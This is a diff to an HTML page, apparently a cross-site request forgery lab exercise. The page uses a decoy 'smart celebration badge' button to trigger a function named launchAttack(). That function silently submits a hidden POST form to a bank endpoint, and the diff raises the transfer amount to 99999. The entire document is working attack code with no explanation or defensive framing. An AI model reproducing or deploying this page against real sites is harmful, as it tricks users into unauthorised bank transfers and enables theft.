@@ -3,7 +3,7 @@
 <head><title>Smart Badges</title></head>
 <body>
     <h2>Look at this smart celebration badge!</h2>
-    <img src="http://mywww.internal/img/badge.jpg" height="50px" width="50px" alt="Badge Celebration "><br><br>
+    <img src="http://attacker.csrf.local/img/badge.jpg" height="50px" width="50px" alt="Badge Celebration "><br><br>
 
     <button onclick="launchAttack()">Click to See More Badges!</button>
     <p id="status">Status</p>
@@ -15,7 +15,7 @@
       function launchAttack() {
         const form = document.createElement("form");
         form.method = "POST";
-        form.action = "http://mywww.internal/csrf/bank.php";  // Change this path if needed
+        form.action = "http://bank.csrf.local/csrf/bank.php";  // Change this path if needed
 	form.target = "hidden_iframe"; // use the predefined iframe
 
         const to = document.createElement("input");
@@ -26,14 +26,14 @@
         const amount = document.createElement("input");
         amount.type = "hidden";
         amount.name = "amount";
-        amount.value = "1000";
+        amount.value = "99999";
 
         form.appendChild(to);
         form.appendChild(amount);
         document.body.appendChild(form);
         form.submit();
 
-	document.getElementById('status').innerHTML = "Request submitted!";
+	document.getElementById('status').innerHTML = "Request submitted! ";
       }
  </script>
 </body>
